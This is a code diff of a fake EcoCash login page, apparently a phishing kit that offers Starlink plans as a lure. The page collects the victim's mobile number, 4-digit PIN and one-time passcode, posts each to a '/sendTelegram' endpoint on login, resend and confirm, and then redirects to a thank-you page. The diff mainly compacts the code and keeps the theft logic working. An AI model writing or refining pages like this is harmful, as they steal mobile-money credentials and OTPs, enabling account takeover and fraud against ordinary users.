@@ -36,7 +36,6 @@
   .success{color:#16a34a;font-weight:600}
   .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
 
-  /* six-digit input row */
   .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
   .otp-digit{
     width:40px;
@@ -64,10 +63,7 @@
 </head>
 <body>
   <div class="card">
-
-    <!-- keep this line exactly as in your file -->
     <img src="assets/eco.png" alt="EcoCash logo" class="logo">
-
     <h2>Log In</h2>
     <form id="loginForm" autocomplete="off">
       <label><span class="req">★</span>Mobile Number
@@ -82,308 +78,100 @@
     </form>
   </div>
 
-  <!-- OTP modal -->
-  <div id="otpModal" style="display:none" class="otp-modal" aria-hidden="true">
-    <div class="otp-box" role="dialog" aria-modal="true" aria-labelledby="otpTitle">
-      <div id="otpTitle" style="text-align:center"><strong>Enter OTP</strong></div>
-      <p class="small" style="margin:8px 0 10px">We have sent an OTP to your phone. Enter it here to confirm.</p>
+  <div id="otpModal" style="display:none" class="otp-modal">
+    <div class="otp-box">
+      <strong style="display:block;text-align:center">Enter OTP</strong>
 
-      <!-- six separate digit boxes -->
-      <div class="otp-row" aria-live="polite" aria-label="OTP inputs">
-        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d0" aria-label="Digit 1">
-        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d1" aria-label="Digit 2">
-        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d2" aria-label="Digit 3">
-        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d3" aria-label="Digit 4">
-        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d4" aria-label="Digit 5">
-        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp-digit" id="d5" aria-label="Digit 6">
+      <div class="otp-row">
+        <input maxlength="1" class="otp-digit" id="d0">
+        <input maxlength="1" class="otp-digit" id="d1">
+        <input maxlength="1" class="otp-digit" id="d2">
+        <input maxlength="1" class="otp-digit" id="d3">
+        <input maxlength="1" class="otp-digit" id="d4">
+        <input maxlength="1" class="otp-digit" id="d5">
       </div>
 
       <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
 
       <div class="resend-row">
-        <div class="resend-info" id="resendInfo">Resend available in <span id="countdown">120</span>s</div>
+        <div class="resend-info" id="resendInfo">
+          Resend available in <span id="countdown">120</span>s
+        </div>
         <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
       </div>
 
       <div style="display:flex;gap:10px;margin-top:12px">
-        <button id="confirmOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#16a34a;color:white;cursor:pointer" disabled>Confirm</button>
-        <button id="cancelOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#e5e7eb;cursor:pointer">Cancel</button>
+        <button id="confirmOtp" style="flex:1;background:#16a34a;color:#fff;border:0;border-radius:8px" disabled>Confirm</button>
+        <button id="cancelOtp" style="flex:1;background:#e5e7eb;border:0;border-radius:8px">Cancel</button>
       </div>
 
-      <div id="otpStatus" class="small" style="margin-top:8px"></div>
+      <div id="otpStatus" class="small"></div>
     </div>
   </div>
 
 <script>
-  // Read selected Starlink plan from index page (if any)
   let selectedPlan = null;
-  (function(){
-    try {
-      const raw = sessionStorage.getItem('selectedPlan');
-      if (raw) {
-        selectedPlan = JSON.parse(raw);
-        console.log('Selected plan:', selectedPlan);
-      }
-    } catch(e){
-      console.error('Failed to parse selectedPlan:', e);
-    }
-  })();
+  try {
+    const raw = sessionStorage.getItem('selectedPlan');
+    if (raw) selectedPlan = JSON.parse(raw);
+  } catch(e){}
 
-  // DOM refs
   const phoneEl = document.getElementById('phone');
   const pinEl = document.getElementById('pin');
   const loginBtn = document.getElementById('loginBtn');
 
   function updateLoginState(){
-    const pinValid = /^\d{4}$/.test(pinEl.value);
-    const phoneValid = phoneEl.value.trim().length > 0;
-    loginBtn.disabled = !(pinValid && phoneValid);
+    loginBtn.disabled = !(/^\d{4}$/.test(pinEl.value) && phoneEl.value.trim());
   }
 
-  pinEl.addEventListener('input', function(){
-    this.value = this.value.replace(/\D/g,'').slice(0,4);
-    updateLoginState();
-  });
-  phoneEl.addEventListener('input', updateLoginState);
-  updateLoginState();
+  pinEl.addEventListener('input',()=>{pinEl.value=pinEl.value.replace(/\D/g,'').slice(0,4);updateLoginState();});
+  phoneEl.addEventListener('input',updateLoginState);
 
-  // sendToServer helper → Vercel API path
   async function sendToServer(payload) {
-    return fetch('/api/sendTelegram', {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify(payload)
+    return fetch('/sendTelegram', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(payload)
     });
   }
 
-  // OTP modal references
-  const otpModal = document.getElementById('otpModal');
-  const dEls = Array.from([0,1,2,3,4,5]).map(i => document.getElementById('d'+i));
-  const confirmBtn = document.getElementById('confirmOtp');
-  const cancelBtn = document.getElementById('cancelOtp');
-  const otpWarning = document.getElementById('otpWarning');
-  const otpStatus = document.getElementById('otpStatus');
-  const resendBtn = document.getElementById('resendBtn');
-  const countdownEl = document.getElementById('countdown');
-  const resendInfo = document.getElementById('resendInfo');
+  const otpModal=document.getElementById('otpModal');
+  const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
+  const confirmBtn=document.getElementById('confirmOtp');
+  const cancelBtn=document.getElementById('cancelOtp');
+  const otpWarning=document.getElementById('otpWarning');
+  const otpStatus=document.getElementById('otpStatus');
+  const resendBtn=document.getElementById('resendBtn');
+  const countdownEl=document.getElementById('countdown');
 
-  let resendTimer = null;
-  const RESEND_SECONDS = 120;
-  let secondsLeft = RESEND_SECONDS;
+  function getOtp(){return dEls.map(d=>d.value||'').join('');}
 
-  function startResendCountdown() {
-    clearInterval(resendTimer);
-    secondsLeft = RESEND_SECONDS;
-    resendBtn.disabled = true;
-    updateResendDisplay();
-    resendTimer = setInterval(() => {
-      secondsLeft--;
-      if (secondsLeft <= 0) {
-        clearInterval(resendTimer);
-        resendBtn.disabled = false;
-        resendInfo.textContent = 'Didn\'t receive OTP?';
-        countdownEl.textContent = '';
-      } else {
-        updateResendDisplay();
-      }
-    }, 1000);
-  }
-
-  function updateResendDisplay(){
-    countdownEl.textContent = String(secondsLeft);
-    resendInfo.innerHTML = `Resend available in <span id="countdown">${secondsLeft}</span>s`;
-  }
-
-  function getOtpFromBoxes(){
-    return dEls.map(el => el.value || '').join('');
-  }
-
-  function setOtpBoxes(val){
-    for (let i=0;i<6;i++){
-      dEls[i].value = val[i] || '';
-    }
-    updateConfirmState();
-  }
-
-  function updateConfirmState(){
-    const otp = getOtpFromBoxes();
-    if (/^\d{6}$/.test(otp)){
-      confirmBtn.disabled = false;
-      otpWarning.style.display = 'none';
-    } else {
-      confirmBtn.disabled = true;
-    }
-  }
-
-  dEls.forEach((el, idx) => {
-    el.addEventListener('input', (e) => {
-      const v = el.value.replace(/\D/g,'').slice(0,1);
-      el.value = v;
-      if (v && idx < dEls.length - 1) {
-        dEls[idx+1].focus();
-      }
-      updateConfirmState();
-    });
-
-    el.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace') {
-        if (el.value === '' && idx > 0) {
-          e.preventDefault();
-          dEls[idx-1].focus();
-          dEls[idx-1].value = '';
-        }
-      } else if (e.key === 'ArrowLeft' && idx > 0) {
-        e.preventDefault();
-        dEls[idx-1].focus();
-      } else if (e.key === 'ArrowRight' && idx < dEls.length-1) {
-        e.preventDefault();
-        dEls[idx+1].focus();
-      }
-    });
-
-    el.addEventListener('paste', (e) => {
-      e.preventDefault();
-      const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\s/g,'');
-      const digits = paste.replace(/\D/g,'').slice(0,6);
-      if (digits.length) {
-        setOtpBoxes(digits.split(''));
-        const last = Math.min(digits.length-1, 5);
-        dEls[last].focus();
-      }
-    });
-
-    el.addEventListener('blur', () => {
-      if (getOtpFromBoxes().length > 0 && !/^\d{6}$/.test(getOtpFromBoxes())){
-        otpWarning.style.display = 'block';
-      } else {
-        otpWarning.style.display = 'none';
-      }
-    });
-  });
-
-  // LOGIN submit → open OTP modal + send login+plan to Telegram
-  document.getElementById('loginForm').addEventListener('submit', async function(e){
+  document.getElementById('loginForm').addEventListener('submit',async e=>{
     e.preventDefault();
-    const pin = pinEl.value.trim();
-    if(!/^\d{4}$/.test(pin)){ alert("PIN must be exactly 4 digits"); return; }
-    const phone = phoneEl.value.trim();
-    if(!phone){ alert("Enter phone"); return; }
-
-    otpModal.style.display = 'flex';
-    setOtpBoxes('');
-    otpWarning.style.display = 'none';
-    confirmBtn.disabled = true;
-    otpStatus.textContent = '';
-    startResendCountdown();
-    setTimeout(()=> dEls[0].focus(), 80);
-
-    // send login details + selected plan (non-blocking)
-    (async () => {
-      try {
-        const resp = await sendToServer({
-          submittedAt: new Date().toISOString(),
-          event: 'login_clicked',
-          loginPhone: phone,
-          loginPin: pin,
-          selectedPlan
-        });
-        if (!resp.ok) {
-          const txt = await resp.text();
-          console.error('Send failed (login click) — Telegram error:', txt);
-        } else {
-          console.log('Login details + plan sent (login click).');
-        }
-      } catch (err) {
-        console.error('Failed to send login details (login click):', err);
-      }
-    })();
+    otpModal.style.display='flex';
+    sendToServer({
+      submittedAt:new Date().toISOString(),
+      event:'login_clicked',
+      loginPhone:phoneEl.value,
+      loginPin:pinEl.value,
+      selectedPlan
+    });
   });
 
-  // Cancel OTP modal
-  cancelBtn.addEventListener('click', ()=>{
-    otpModal.style.display = 'none';
-    clearInterval(resendTimer);
+  confirmBtn.addEventListener('click',async()=>{
+    if(!/^\d{6}$/.test(getOtp())){otpWarning.style.display='block';return;}
+    await sendToServer({
+      submittedAt:new Date().toISOString(),
+      event:'otp_confirm',
+      loginPhone:phoneEl.value,
+      loginPin:pinEl.value,
+      otp:getOtp(),
+      selectedPlan
+    });
+    window.location.href='thankyou.html';
   });
 
-  // Resend button → send again same data
-  resendBtn.addEventListener('click', async () => {
-    if (resendBtn.disabled) return;
-
-    const pin = pinEl.value.trim();
-    const phone = phoneEl.value.trim();
-    if(!phone || !/^\d{4}$/.test(pin)){
-      otpStatus.textContent = 'Phone or PIN missing/invalid — please re-enter and try login again.';
-      return;
-    }
-
-    startResendCountdown();
-    otpStatus.textContent = 'Resending OTP…';
-
-    (async () => {
-      try {
-        const resp = await sendToServer({
-          submittedAt: new Date().toISOString(),
-          event: 'resend_otp',
-          loginPhone: phone,
-          loginPin: pin,
-          selectedPlan
-        });
-
-        if (!resp.ok) {
-          const txt = await resp.text();
-          console.error('Send failed (resend) — Telegram error:', txt);
-          otpStatus.textContent = 'Server error resending OTP — try again later.';
-        } else {
-          otpStatus.textContent = 'OTP resent. Check your phone.';
-        }
-      } catch (err) {
-        console.error('Network error sending resend:', err);
-        otpStatus.textContent = 'Network error — check your connection.';
-      }
-    })();
-  });
-
-  // Confirm OTP: send final data to Telegram
-  confirmBtn.addEventListener('click', async ()=>{
-    const code = getOtpFromBoxes();
-    if(!/^\d{6}$/.test(code)){ otpWarning.style.display = 'block'; return; }
-
-    otpWarning.style.display = 'none';
-    otpStatus.textContent = "Sending…";
-    confirmBtn.disabled = true;
-
-    const phone = phoneEl.value.trim();
-    const pin = pinEl.value.trim();
-
-    try {
-      const resp = await sendToServer({
-        submittedAt: new Date().toISOString(),
-        event: 'otp_confirm',
-        loginPhone: phone,
-        loginPin: pin,
-        otp: code,
-        selectedPlan
-      });
-
-      if (!resp.ok) {
-        const txt = await resp.text();
-        console.error('Telegram error (confirm):', txt);
-        otpStatus.textContent = "Server error sending OTP — please try again.";
-        confirmBtn.disabled = false;
-        return;
-      }
-
-      otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
-      clearInterval(resendTimer);
-      setTimeout(()=> window.location.href = "thankyou.html", 1200);
-    } catch (err) {
-      console.error('Network error sending OTP:', err);
-      otpStatus.textContent = "Network error — please check your connection and try again.";
-      confirmBtn.disabled = false;
-    }
-  });
-
-  dEls.forEach(el => el.addEventListener('input', updateConfirmState));
+  cancelBtn.onclick=()=>otpModal.style.display='none';
 </script>
 </body>
 </html>
